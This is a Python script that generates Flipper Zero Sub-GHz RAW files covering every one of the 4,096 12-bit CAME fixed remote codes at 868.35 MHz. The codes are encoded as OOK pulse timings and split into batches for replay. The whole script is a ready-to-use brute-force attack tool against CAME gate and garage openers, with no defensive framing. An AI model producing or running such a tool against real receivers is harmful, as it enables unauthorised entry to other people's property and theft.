import os

# Script settings:
split = [100, 500, 1000, 2000, 4096]
signal = 250
repetition = 3
n_bits = 12
file_header = """
Filetype: Flipper SubGhz RAW File
Version: 1
Frequency:  868350000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: RAW
"""

# Protocol settings: https://phreakerclub.com/447
combos = range(0, pow(2, n_bits))
H = 2*signal
Pilot = -36*signal

transposition_table = {
    "0": f"-{signal} {H} ",
    "1": f"-{H} {signal} ",
}
pilot_period = f"{Pilot} {signal} "

for item in split:

    for key_dec in combos:
        key_bin = f"{key_dec:0{n_bits}b}"  # format as 12 digits bin
        key_str = pilot_period
        for bit in key_bin:
            key_str += transposition_table[bit]
        joined = "".join(key_str)
        key_str = key_str * repetition


        if (key_dec % item) == 0:
            filename = f"CAME_{item}_{int(key_dec / item):003}.sub"
            os.makedirs(f"{item}", exist_ok=True)
            fulldir = f"{item}/{filename}"
            with open(fulldir, "w") as f:
                f.write(file_header)
        with open(fulldir, "a") as f:
            f.write("RAW_Data: " + key_str + "\n")
